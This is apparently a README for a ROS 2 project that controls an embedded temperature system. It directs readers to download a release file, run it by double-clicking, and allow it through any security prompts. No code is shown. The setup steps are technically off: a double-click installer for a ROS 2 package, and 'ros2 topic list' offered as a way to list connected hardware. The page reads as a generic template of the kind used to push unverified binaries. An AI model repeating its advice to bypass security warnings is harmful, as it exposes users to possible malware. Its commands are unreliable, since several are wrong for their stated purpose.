## 🚀 Getting Started
Welcome to the Temp_ControlMod_ROS_integration project! This software allows you to manage and monitor an embedded temperature control system using the ROS 2 framework. You can control the system in real time, receive telemetry data, and manage setpoints easily. Follow the steps below to download and set up the application on your device.

## 📦 System Requirements
To run this software, you need the following:

- A computer with Windows, macOS, or Linux operating system.
- An active internet connection for downloading the software.
- A Raspberry Pi or Teensy board to interface with your temperature control system.
- ROS 2 installed on your computer. You can find installation instructions on the [ROS 2 website](https://docs.ros.org/en/foxy/Installation.html).

## 📤 Download & Install
1. Visit this page to download: [GitHub Releases](https://github.com/shahyadtest/Temp_ControlMod_ROS_integration/releases).

2. Choose the latest release version.

3. Download the corresponding release file to your computer. 

4. Locate the downloaded file in your downloads folder.

5. Run the installer by double-clicking on the file. If you encounter any security prompts, select the option to allow the program to run.

6. Follow the installation prompts that appear. You may need to agree to the license agreement and choose an installation directory.

## 🔌 Connecting Hardware
Once installation is complete, you will need to connect the temperature control device to your Raspberry Pi or Teensy board:

1. **Locate your device's serial port.** Consult the user manual for your hardware if necessary.

2. Use a USB cable to connect the board to your computer.

3. Open the terminal on your computer.

4. Use the following command to list the connected devices:
   ```
   ros2 topic list
   ```
   This command will help verify that your device is recognized by your system.

## ⚙️ Configuring the Application
To configure the application, follow these steps:

1. Open a terminal window.

2. Navigate to the installation directory:
   ```
   cd /path/to/installation/directory
   ```

3. Launch the application using the command:
   ```
   ros2 run temp_control_mod main
   ```

4. The main interface will load, showing you options to set and monitor your temperature control parameters.

5. Adjust the settings as needed, including temperature setpoints and control modes.

## 📊 Using the Interface
You will find several sections in the interface:

- **Telemetry Data:** This displays real-time readings from your temperature sensors.
- **Setpoint Management:** Use this section to adjust and save temperature setpoints.
- **Control Modes:** Switch between manual and automatic control modes easily.

Pay attention to real-time updates as they reflect the current status of your system.

## 🛠️ Troubleshooting Common Issues
If you encounter issues, try the following solutions:

- **Device Not Recognized:** Ensure that the board is properly connected and powered on. Reboot your computer if necessary.

- **Software Error:** Check for updates on the GitHub Releases page and ensure you have the correct version installed.

- **Network Connection Issues:** Make sure your device is connected to the internet and that your firewall is not blocking ROS 2.
